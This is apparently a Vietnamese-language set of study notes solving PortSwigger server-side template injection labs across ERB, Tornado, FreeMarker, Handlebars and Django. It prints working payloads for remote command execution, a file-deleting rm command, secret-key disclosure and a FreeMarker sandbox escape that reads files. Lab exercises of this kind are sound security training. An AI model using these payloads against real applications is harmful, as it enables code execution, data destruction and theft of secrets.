
# [Lab 1: Basic server-side template injection](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic)

![Yêu cầu lab 1](../image/lab1/0.png)

Đọc qua yêu cầu:

- Sử dụng `ERB template`

- Goal: RCE, delete `moracle.txt` từ Carlos's home directory --> `rm /home/carlos/morale.txt`

![main web](../image/lab1/01.png)

2 chức năng

1. `Home`

2. `View details`

chưa thấy có chức năng nào có reflected, thử test `View details`, khi nhấn view details --> `Unfortunately this product is out of stock`

![request get message](../image/lab1/02.png)

![Alt text](../image/lab1/03.png)

![message gì](../image/lab1/04.png)

![trả về y chang](../image/lab1/05.png)

--> reflected đây, tìm template xem có đúng là `ERB template` không

![Alt text](../image/lab1/06.png)

![49](../image/lab1/07.png)

--> `ERB template`

--> payload: thực thi câu lệnh hệ thống `<%= system('rm /home/carlos/morale.txt') %>`

![Alt text](../image/lab1/08.png)

solve the lab

![Alt text](../image/lab1/09.png)

> **Test bằng Intruder add Position và Scan**

![Alt text](../image/lab1/10.png)

![Alt text](../image/lab1/11.png)

> **Test bằng Active Scan**

ra `OS command injection` --> có thể thực hiện RCE

![Alt text](../image/lab1/12.png)

# [Lab 2: Basic server-side template injection (code context)](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context)

![Yêu cầu lab 2](../image/lab2/0.png)

- Using `Tornado` template

- goal: RCE, `rm /home/carlos/morale.txt`

![main web](../image/lab2/01.png)

3 chức năng

1. `Home`

2. `My account`

login with `wiener:peter`, --> `update preferred name`

![Alt text](../image/lab2/02.png)

3. `View post`

có chức năng `Comment`

![Alt text](../image/lab2/03.png)

khi comment xong sẽ các đối số bị paramater --> comment hoặc là name

![Alt text](../image/lab2/04.png)

ta test update name trước

![Alt text](../image/lab2/05.png)

![Alt text](../image/lab2/06.png)

![reflected](../image/lab2/07.png)

chính là `Tornado`

![Alt text](../image/lab2/08.png)

![Alt text](../image/lab2/09.png)

--> {{os.system('rm /home/carlos/morale.txt')}}

![Alt text](../image/lab2/10.png)

![Alt text](../image/lab2/11.png)

![Alt text](../image/lab2/12.png)

solve the lab

![Alt text](../image/lab2/13.png)

> **Test bằng Active Scan**



# [Lab 3: Server-side template injection using documentation](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-using-documentation)

![Yêu cầu lab 3](../image/lab3/0.png)

- goal: RCE, `rm /home/carlos/morale.txt`

![main web](../image/lab3/01.png)

3 chức năng

1. `Home`

2. `My account`

login with `content-manager:C0nt3ntM4n4g3r`

![Alt text](../image/lab3/02.png)

3. `View details`

login xong vào `View details` sẽ có chức năng mới `Edit template`

![Alt text](../image/lab3/03.png)

vào xem thử

![Alt text](../image/lab3/04.png)

ta thấy template như nào thì view sẽ hiện ra như vậy --> reflected --> test

![Alt text](../image/lab3/05.png)![Alt text](../image/lab3/06.png)![Alt text](../image/lab3/07.png)

--> có thể là `FreeMarker`

![Alt text](../image/lab3/08.png)

--> chắc chắn luôn rồi

now test OS command: `${"freemarker.template.utility.Execute"?new()("id")}`

ok thành công thực hiện OS command

![Alt text](../image/lab3/09.png)

now `rm /home/carlos/morale.txt`

solve the lab

![Alt text](../image/lab3/10.png)

> **Test bằng Active Scan**

![Alt text](../image/lab3/11.png)

![Alt text](../image/lab3/12.png)

![Alt text](../image/lab3/13.png)

phát hiện ra cả `Reflected XSS` nhưng bài này chưa cần quan tâm

# [Lab 4: Server-side template injection in an unknown language with a documented exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-an-unknown-language-with-a-documented-exploit)

![Yêu cầu lab 4](../image/lab4/0.png)

- goal: xác định template, RCE, `rm /home/carlos/morale.txt`

![main web](../image/lab4/01.png)

2 chức năng

1. `Home`

2. `View details` 1 sản phẩm bất kỳ, ta thấy message

![Alt text](../image/lab4/02.png)

request call message, ta thấy đã có reflected ở đây

![Alt text](../image/lab4/03.png)

test `{{7*7}}`

![Alt text](../image/lab4/04.png)

ta thấy lỗi --> xác định được template là `Handlebars`

![Alt text](../image/lab4/05.png)

--> payload RCE

```
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![Alt text](../image/lab4/06.png)

![Alt text](../image/lab4/07.png)

now `rm /home/carlos/morale.txt`

![Alt text](../image/lab4/08.png)

solve the lab

![Alt text](../image/lab4/09.png)

> **Test bằng Intruder add Position Scan**

![Alt text](../image/lab4/11.png)

![Alt text](../image/lab4/12.png)

![Alt text](../image/lab4/13.png)

![Alt text](../image/lab4/14.png)

# [Lab 5: Server-side template injection with information disclosure via user-supplied objects](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-information-disclosure-via-user-supplied-objects)

![Yêu cầu lab 5](../image/lab5/0.png)

**- goal: steal and submit the framework's secret key**

![main web](../image/lab5/01.png)

có 3 chức năng

1. `Home`

2. `My account`

login with `content-manager:C0nt3ntM4n4g3r`

![Alt text](../image/lab5/02.png)

3. `View details`

login xong vào `View details` sẽ có chức năng mới `Edit template`

![Alt text](../image/lab5/03.png)

vào xem thử

![Alt text](../image/lab5/04.png)

ta thấy template như nào thì view sẽ hiện ra như vậy --> reflected --> test

phát hiện lỗi --> template: `django`

![Alt text](../image/lab5/05.png)

search google --> tìm payload get `SECRET_KEY` --> `{{settings.SECRET_KEY}}`

[![Alt text](../image/lab5/06.png)](https://gitbook.seguranca-informatica.pt/fuzzing-and-web/server-side-template-injection-ssti)

![Alt text](../image/lab5/07.png)![Alt text](../image/lab5/08.png)

submit and solve the lab

![Alt text](../image/lab5/09.png)

> **Test bằng Intruder add Position Scan**

![Alt text](../image/lab5/10.png)

![Alt text](../image/lab5/11.png)

![Alt text](../image/lab5/12.png)

![Alt text](../image/lab5/13.png)

# [Lab 6: Server-side template injection in a sandboxed environment](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-in-a-sandboxed-environment)

![Yêu cầu lab 6](../image/lab6/0.png)

**- goal: break out of the sandbox to read the file `/home/carlos/my_password.txt` and submit**

![main web](../image/lab6/01.png)

có 3 chức năng

1. `Home`

2. `My account`

login with `content-manager:C0nt3ntM4n4g3r`

![Alt text](../image/lab6/02.png)

3. `View details`

login xong vào `View details` sẽ có chức năng mới `Edit template`

![Alt text](../image/lab6/03.png)

vào xem thử

![Alt text](../image/lab6/04.png)

ta thấy template như nào thì view sẽ hiện ra như vậy --> reflected --> test

![Alt text](../image/lab6/05.png)

phát hiện lỗi --> tìm được template `FreeMarker`

![Alt text](../image/lab6/06.png)

bị block rồi --> bypass: 

```
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('path_to_the_file').toURL().openStream().readAllBytes()?join(" ")}
Convert the returned bytes to ASCII

```

ta được chuỗi ASCII

![Alt text](../image/lab6/07.png)

convert to text

![Alt text](../image/lab6/08.png)

submit and solve the lab

![Alt text](../image/lab6/09.png)

![Alt text](../image/lab6/10.png)

> **Test bằng Active Scan**

![Alt text](../image/lab6/11.png)

![Alt text](../image/lab6/12.png)

![Alt text](../image/lab6/13.png)

![Alt text](../image/lab6/14.png)

# [Lab 7: Server-side template injection with a custom exploit](https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-with-a-custom-exploit)

![Yêu cầu lab 7](image.png)


> **Test bằng Active Scan**

